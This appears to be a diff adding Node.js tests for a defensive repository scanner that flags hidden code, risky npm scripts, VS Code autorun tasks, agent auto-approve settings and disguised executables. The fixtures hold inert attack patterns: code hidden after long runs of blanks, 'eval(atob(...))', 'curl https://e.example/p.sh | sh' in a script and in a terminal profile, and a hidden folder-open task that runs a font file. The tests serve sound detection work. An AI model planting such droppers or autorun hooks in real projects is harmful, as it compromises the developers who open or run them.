@@ -534,3 +534,125 @@ test('lock-diff: direct and transitive changes, read-only', () => {
   assert.equal(snapshot(dir), before);
   assert.equal(run('lock-diff.mjs', [path.join(dir, 'missing.json'), dir]).code, 2);
 });
+
+// ---------- 0.1.4: editor files, root executables, script map, hidden code ----------
+// Fixture code is never run. Payload text is inert and uses reserved .example domains.
+
+const blanks = (n) => ' '.repeat(n);
+const byId = (json, id) => json.findings.filter((f) => f.id === id);
+
+const hiddenRepo = () => fixture({
+  'package.json': {
+    name: 'defi-dashboard', private: true,
+    scripts: { dev: 'vite && node src/utils/helpers', start: 'npm run dev', both: 'concurrently "npm run dev" "node server/index.js"', lint: 'eslint .' },
+    devDependencies: { vite: '^7.0.0', eslint: '^9.0.0', concurrently: '^9.0.0' },
+  },
+  'src/utils/helpers.js': `export const f = (n) => n.toFixed(2);${blanks(400)}require('child_process').exec('echo inert');\n`,
+  'server/index.js': 'export const ok = true;\n',
+  'tailwind.config.js': `module.exports = { content: [] };${blanks(774)}eval(atob('aW5lcnQ='));\n`,
+  'src/banner.js': `console.log("${blanks(120)}Welcome");\n`,
+});
+
+test('inspect-repo: code after a long run of blanks is hidden code', () => {
+  const r = runJson('inspect-repo.mjs', [hiddenRepo()]);
+  const hidden = byId(r.json, 'HIDDEN_CODE');
+  const high = hidden.filter((f) => f.risk === 'high').map((f) => f.file).sort();
+  assert.deepEqual(high, ['src/utils/helpers.js:1', 'tailwind.config.js:1']);
+  assert.ok(hidden.find((f) => f.file === 'tailwind.config.js:1').detail.includes('after 774 blank characters'));
+  assert.ok(hidden.some((f) => f.file === 'src/banner.js:1' && f.risk === 'medium'), 'blank run inside a string is medium');
+  const ind = byId(r.json, 'CODE_INDICATORS').find((f) => f.file === 'tailwind.config.js');
+  assert.equal(ind.risk, 'high');
+});
+
+test('inspect-repo: script map follows run chains and concurrently, resolves extensions', () => {
+  const r = runJson('inspect-repo.mjs', [hiddenRepo()]);
+  const map = Object.fromEntries(r.json.scriptMap.map((e) => [e.script, e]));
+  assert.deepEqual(map.dev.files, ['src/utils/helpers.js']);
+  assert.deepEqual(map.start.files, ['src/utils/helpers.js']);
+  assert.deepEqual(map.both.files.sort(), ['server/index.js', 'src/utils/helpers.js']);
+  assert.deepEqual(map.lint.files, []);
+  const runs = byId(r.json, 'SCRIPT_RUNS_FILE').find((f) => f.file === 'src/utils/helpers.js');
+  assert.match(runs.detail, /package\.json#dev/);
+});
+
+test('inspect-repo: inline code, downloads and remote packages in scripts', () => {
+  const dir = fixture({ 'package.json': { name: 'a', scripts: {
+    check: 'node -e "process.exit(0)"',
+    boot: "node -e \"require('https').get('https://e.example/p')\"",
+    fetch: 'curl -s https://e.example/p.sh | sh',
+    tool: 'npx some-tool@1.0.0',
+  } } });
+  const r = runJson('inspect-repo.mjs', [dir]);
+  const inline = byId(r.json, 'SCRIPT_INLINE_CODE');
+  assert.equal(inline.find((f) => f.file === 'package.json#check').risk, 'medium');
+  assert.equal(inline.find((f) => f.file === 'package.json#boot').risk, 'high');
+  assert.equal(byId(r.json, 'SCRIPT_DOWNLOAD')[0].file, 'package.json#fetch');
+  assert.match(byId(r.json, 'SCRIPT_REMOTE_PACKAGE')[0].detail, /some-tool@1\.0\.0/);
+});
+
+test('inspect-repo: VS Code files and workspace files', () => {
+  const dir = fixture({
+    'package.json': { name: 'a' },
+    '.vscode/tasks.json': '{ // c\n "version": "2.0.0", "tasks": [ { "label": "eslint-check", "type": "shell", "command": "node ./public/font.woff2", "hide": true, "runOptions": { "runOn": "folderOpen" } }, ] }',
+    '.vscode/settings.json': JSON.stringify({
+      'task.allowAutomaticTasks': 'on', 'chat.tools.autoApprove': true, 'js/ts.tsdk.path': 'node_modules/typescript/lib',
+      'terminal.integrated.profiles.windows': { x: { path: 'cmd.exe', args: ['/c', 'curl https://e.example | sh'] } },
+      'python.defaultInterpreterPath': '.venv/bin/python',
+    }),
+    '.vscode/launch.json': JSON.stringify({ configurations: [{ name: 'dbg', preLaunchTask: 'build' }] }),
+    '.vscode/mcp.json': JSON.stringify({ servers: { h: { command: 'npx', args: ['-y', 'x-mcp'] } } }),
+    '.vscode/extensions.json': JSON.stringify({ recommendations: ['someone.ext'] }),
+    'app.code-workspace': JSON.stringify({ settings: { 'git.path': 'C:\\\\tools\\\\git.exe' } }),
+  });
+  const r = runJson('inspect-repo.mjs', [dir]);
+  const ids = (id, risk) => byId(r.json, id).filter((f) => !risk || f.risk === risk);
+  assert.equal(ids('EDITOR_AUTORUN', 'high').length, 1);
+  assert.equal(ids('EDITOR_HIDDEN_TASK', 'high').length, 1);
+  assert.equal(ids('EDITOR_AUTOTASKS_SETTING', 'high').length, 1);
+  assert.equal(ids('EDITOR_AGENT_AUTOAPPROVE', 'high').length, 1);
+  assert.ok(ids('EDITOR_EXEC_SETTING', 'high').some((f) => f.detail.includes('profiles.windows.x.args')));
+  assert.ok(ids('EDITOR_EXEC_SETTING', 'medium').some((f) => f.detail.startsWith('python.defaultInterpreterPath')));
+  assert.ok(ids('EDITOR_EXEC_SETTING', 'high').some((f) => f.file === 'app.code-workspace'));
+  assert.ok(!r.json.findings.some((f) => f.detail.startsWith('js/ts.tsdk.path')), 'tsdk path is not an executable setting');
+  assert.equal(ids('EDITOR_LAUNCH', 'medium').length, 1);
+  assert.equal(ids('MCP_SERVER', 'high').length, 1);
+  assert.equal(ids('EDITOR_EXTENSIONS', 'low').length, 1);
+});
+
+test('inspect-repo: invalid editor JSON is reported', () => {
+  const r = runJson('inspect-repo.mjs', [fixture({ '.vscode/tasks.json': '{ "tasks": [ ' })]);
+  assert.equal(byId(r.json, 'EDITOR_UNPARSED')[0].risk, 'medium');
+});
+
+test('inspect-repo: executables at the root with a tool name', () => {
+  const dir = fixture({ 'package.json': { name: 'a' }, 'git.exe': '', 'npm.cmd': '', 'helper.exe': '', 'docs/node.exe': '' });
+  const r = runJson('inspect-repo.mjs', [dir]);
+  assert.deepEqual(byId(r.json, 'ROOT_TOOL_BINARY').map((f) => f.file).sort(), ['git.exe', 'npm.cmd']);
+  assert.deepEqual(byId(r.json, 'ROOT_EXECUTABLE').map((f) => f.file), ['helper.exe']);
+});
+
+test('inspect-repo: ordinary project has no high finding and is not changed', () => {
+  const dir = fixture({
+    'package.json': { name: 'app', private: true, scripts: { dev: 'vite', build: 'tsc && vite build', test: 'vitest run', start: 'node server.js' }, devDependencies: { vite: '^7.0.0', vitest: '^3.0.0', typescript: '^5.9.0' } },
+    'pnpm-lock.yaml': "lockfileVersion: '9.0'\n",
+    'server.js': "import http from 'node:http';\nhttp.createServer((q, s) => s.end('ok')).listen(3000);\n",
+    'vite.config.ts': "import { defineConfig } from 'vite';\nexport default defineConfig({ server: { port: 5173 } });\n",
+    'src/main.ts': "const msg: string = 'hello';\nconsole.log(msg);\n",
+    '.vscode/settings.json': '{ "editor.formatOnSave": true, "js/ts.tsdk.path": "node_modules/typescript/lib" }',
+  });
+  const before = snapshot(dir);
+  const r = runJson('inspect-repo.mjs', [dir]);
+  assert.equal(r.json.counts.high, 0, JSON.stringify(r.json.findings));
+  assert.deepEqual(byId(r.json, 'SCRIPT_RUNS_FILE').map((f) => f.file), ['server.js']);
+  assert.equal(snapshot(dir), before);
+});
+
+test('npm references: VS Code tasks of type npm', () => {
+  const dir = fixture({
+    'package.json': pnpmPkg, 'pnpm-lock.yaml': pnpmLock, 'pnpm-workspace.yaml': template,
+    '.vscode/tasks.json': '{\n  "tasks": [\n    { "type": "npm", "script": "start" }\n  ]\n}\n',
+    '.git/config': gitConfig('https://github.com/me/a.git'),
+  });
+  const out = JSON.parse(run('detect.mjs', [dir, '--owners', 'me']).stdout);
+  assert.deepEqual(out.facts.npmReferences.map((r) => `${r.file}:${r.line}`), ['.vscode/tasks.json:3']);
+});
